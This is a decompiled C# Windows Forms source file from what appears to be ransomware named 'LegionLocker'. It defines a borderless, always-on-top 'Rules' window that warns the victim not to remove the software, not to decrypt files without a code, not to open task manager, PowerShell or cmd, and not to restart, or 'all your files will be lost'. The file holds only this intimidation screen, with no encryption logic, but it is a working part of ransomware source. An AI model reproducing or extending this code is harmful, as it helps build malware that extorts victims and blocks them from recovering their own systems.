using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace LegionLocker;

public class Rules : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private Label label6;

	public Rules()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_0192: Unknown result type (might be due to invalid IL or missing references)
		//IL_019c: Expected O, but got Unknown
		//IL_0225: Unknown result type (might be due to invalid IL or missing references)
		//IL_022f: Expected O, but got Unknown
		//IL_02b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Expected O, but got Unknown
		//IL_034e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0358: Expected O, but got Unknown
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.Lime);
		((Control)label1).set_Location(new Point(183, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(69, 24));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Rules:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.Lime);
		((Control)label2).set_Location(new Point(1, 47));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(276, 24));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("+Do not try remove this software");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.Lime);
		((Control)label3).set_Location(new Point(1, 81));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(451, 24));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("+Do not try decrypt your files without decryption code");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_ForeColor(Color.Lime);
		((Control)label4).set_Location(new Point(1, 114));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(410, 24));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("+Do not run task manager, powershell, cmd etc.");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label5).set_ForeColor(Color.Lime);
		((Control)label5).set_Location(new Point(1, 148));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(258, 24));
		((Control)label5).set_TabIndex(4);
		((Control)label5).set_Text("+Do not restart your computer");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label6).set_ForeColor(Color.Red);
		((Control)label6).set_Location(new Point(103, 359));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(224, 24));
		((Control)label6).set_TabIndex(5);
		((Control)label6).set_Text("Or all your files will be lost");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(453, 392));
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Rules");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Rules");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
